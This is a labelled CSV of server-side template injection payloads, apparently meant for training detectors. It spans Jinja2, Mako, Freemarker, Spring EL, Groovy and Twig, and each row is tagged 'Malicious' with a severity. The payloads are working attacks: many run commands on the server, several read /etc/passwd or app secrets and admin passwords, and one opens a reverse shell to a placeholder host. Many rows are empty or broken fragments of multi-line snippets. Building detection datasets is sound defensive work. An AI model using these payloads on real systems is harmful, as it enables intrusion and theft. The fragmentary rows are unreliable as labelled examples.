"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
{{ someString.toUPPERCASE() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% set cmd = 'id' %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% set bytes = (1).TYPE,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ (1).TYPE,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${String x = new File('c:/windows/notepad.exe').text},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${String x = new File('/path/to/file').getText('UTF-8')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${new File(""C:\Temp\FileName.txt"").createNewFile();}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""http://www.google.com"".toURL().text}",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
"${new URL(""http://www.google.com"").getText()}",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
"${""calc.exe"".execute()}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${this.evaluate(""9*9"") //(this is a Script class)}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${new org.codehaus.groovy.runtime.MethodClosure(""calc.exe"",""execute"").call()}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${7*7},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${'patt'.toString().replace('a', 'x')}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${pageContext.request.getSession().setAttribute(""admin"",true)}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${request.setAttribute(""c"","""".getClass().forName(""java.util.ArrayList"").newInstance())}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${request.getAttribute(""c"").add(""cmd.exe"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${request.getAttribute(""c"").add(""/k"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${request.getAttribute(""c"").add(""ping x.x.x.x"")}",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
"${request.setAttribute(""a"","""".getClass().forName(""java.lang.ProcessBuilder"").getDeclaredConstructors()[0].newInstance(request.getAttribute(""c"")).start())}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${request.getAttribute(""a"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${9*9},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${...},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"    """,SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
"${{<%[%'""}}%\.",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"- """,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"- """,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% csrf_token %} # Causes error with Jinja2,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ 7*7 }}  # Error with Django Templates,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% debug %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ messages.storages.0.signer.key }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% include 'admin/base.html' %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% load log %}{% get_admin_log 10 as log %}{% for e in log %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{e.user.get_username}} : {{e.user.password}}{% endfor %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% get_admin_log 10 as admin_log for_user user %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{4*4}}[[5*5]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*'7'}} would result in 7777777,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% extends """"layout.html"""" %}""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% block body %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% for user in users %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% endfor %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% endblock %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<pre>{% debug %}</pre>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ self.__init__.__globals__.__builtins__ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<dt>{{ key|e }}</dt>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<dd>{{ value|e }}</dd>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{% endfor %},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ cycler.__init__.__globals__.os.popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ joiner.__init__.__globals__.os.popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ namespace.__init__.__globals__.os.popen('id').read() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{ lipsum.__globals__[""os""].popen('id').read() }}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ config.from_pyfile('/tmp/evilconfig.cfg') }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*7}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*'7'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${x},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
">>> print(Template(""${self.module.cache.util.os}"").render())",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${ },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${ },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${ },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
If the Debug Extension is enabled, a ",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{4*4}}[[5*5]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*7}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{7*'7'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<%= 7 * 7 %>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{7*7}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
@(1+2),SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{ 7 * 7 },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{app.request.server.all|join('","')}}""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}} ,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{$smarty.version},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{php}echo `id`;{/php},SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.cache.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${self.__init__.__globals__['util'].os.system('id')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.filters.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.exceptions.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${self.template.__init__.__globals__['os'].system('id')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.cache.util.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.util.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template._mmarker.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.cache.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template._mmarker.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.filters.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.exceptions.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
{{self._TemplateReference__context.cycler.__init__.__globals__.os}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self._TemplateReference__context.joiner.__init__.__globals__.os}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self._TemplateReference__context.namespace.__init__.__globals__.os}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
